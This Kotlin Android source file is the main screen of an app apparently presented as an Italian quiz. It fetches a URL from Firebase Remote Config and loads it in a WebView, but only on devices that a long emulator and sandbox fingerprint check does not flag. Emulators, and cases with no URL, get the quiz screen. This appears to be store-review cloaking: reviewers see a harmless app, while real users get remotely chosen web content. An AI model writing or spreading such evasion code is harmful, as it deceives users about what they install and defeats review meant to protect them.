@file:Suppress("DEPRECATION")

package com.quizeu.appitaly.view

import android.animation.ObjectAnimator
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkInfo
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.animation.LinearInterpolator
import android.widget.ProgressBar
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.quizeu.appitaly.R
import com.quizeu.appitaly.model.WV
import java.util.Locale


@Suppress("DEPRECATION")
class MainActivity : AppCompatActivity() {

    private lateinit var progressBar: ProgressBar
    private lateinit var mFirebaseRemoteConfig: FirebaseRemoteConfig
    private lateinit var sharedPrefs: SharedPreferences

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        supportActionBar?.hide()
        initializeApp()
        sharedPrefs = getSharedPreferences("MyAppPrefs", Context.MODE_PRIVATE)
        // Запуск инициализации, которая займет некоторое время


        mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance()
        val savedUrl = sharedPrefs.getString("savedUrl", "")

if (isNetworkAvailable()) {
    if (savedUrl.isNullOrEmpty() ) {
        try {
            // Выполняем запрос на получение данных
            mFirebaseRemoteConfig.fetchAndActivate().addOnCompleteListener(this) { task ->
                if (task.isSuccessful) {
                    val url = mFirebaseRemoteConfig.getString("url")
                    Log.d("MainActivity", "1 Значение URL из Remote Config: $url")

                    if (url.isNullOrEmpty() || isEmulator()) {
                        Log.d("MainActivity", "эмулятор/пустая ссылка")
                        openChooseActivity()
                    } else {
                        with(sharedPrefs.edit()) {
                            putString("savedUrl", url)
                            apply()
                        }
                        openWebViewActivity()
                        Log.d("MainActivity", "зашел1")
                    }
                } else {
                    Log.d("MainActivity", "зашел2")
                    openChooseActivity()
                }
            }
        } catch (e: Exception) {
            Log.d("MainActivity", "зашел3")
            openChooseActivity()
        }

    } else {
        openWebViewActivity()
        Log.d("MainActivity", "3 Значение URL из Remote Config: $savedUrl")
    }
}else {
    Log.d("MainActivity", "Нет интернета")
    openChooseActivity()
}

    }

    private fun initializeApp() {
        progressBar = findViewById(R.id.progressBar)
        Log.d("MainActivity", "прогресс бар")
        val rotation = ObjectAnimator.ofFloat(progressBar, "rotation", 0f, 360f)
        rotation.duration = 2000 // Длительность анимации в миллисекундах (2 секунды)
        rotation.repeatCount = 0 // Нет повторений (один раз)
        rotation.interpolator = LinearInterpolator() // Линейное изменение угла
        rotation.start() // Запустить анимацию
    }

    private fun openChooseActivity() {
        val intent = Intent(this@MainActivity, ChooseActivity::class.java)
        startActivity(intent)
        Log.d("MainActivity", " открываем AnotherActivity")
    }

    private fun openWebViewActivity() {
        val intent = Intent(this@MainActivity, WV::class.java)
        startActivity(intent)
        Log.d("MainActivity", "Первый запуск приложения, открываем WebViewActivity")
    }


    private fun handleFetchFailure() {
        showToast("Failed to fetch data. Please check your network connection.")
        showErrorScreenWithMessage("Failed to fetch data. Please check your network connection.")
        Log.e("MainActivity", "Error while fetching data from Firebase Remote Config")
    }

    private fun showToast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }

    private fun isNetworkAvailable(): Boolean {
        val connectivityManager =
            getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo: NetworkInfo? = connectivityManager.activeNetworkInfo
        return networkInfo?.isConnectedOrConnecting == true
    }

    private fun showErrorScreenWithMessage(errorMessage: String) {
        val errorIntent = Intent(this, NoInternetActivity::class.java)
        errorIntent.putExtra("message", errorMessage)
        startActivity(errorIntent)
    }


    private fun isEmulator(): Boolean {
        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE


        var result =
            (Build.FINGERPRINT.startsWith("generic") || phoneModel.contains("google_sdk") || phoneModel.lowercase(
                Locale.getDefault()
            )
                .contains("droid4x") || phoneModel.contains("Emulator") || phoneModel.contains("Android SDK built for x86") || Build.MANUFACTURER.contains(
                "Genymotion"
            ) || buildHardware == "goldfish" || Build.BRAND.contains("google") || buildHardware == "vbox86" || buildProduct == "sdk" || buildProduct == "google_sdk" || buildProduct == "sdk_x86" || buildProduct == "vbox86p" || Build.BOARD.lowercase(
                Locale.getDefault()
            ).contains("nox") || Build.BOOTLOADER.lowercase(Locale.getDefault())
                .contains("nox") || buildHardware.lowercase(Locale.getDefault())
                .contains("nox") || buildProduct.lowercase(Locale.getDefault()).contains("nox"))

        if (result) return true
        result = result or (Build.BRAND.startsWith("generic")) && Build.DEVICE.startsWith(
            "generic"
        )
        if (result) return true
        result = result or ("google_sdk" == buildProduct)
        return result


    }


}
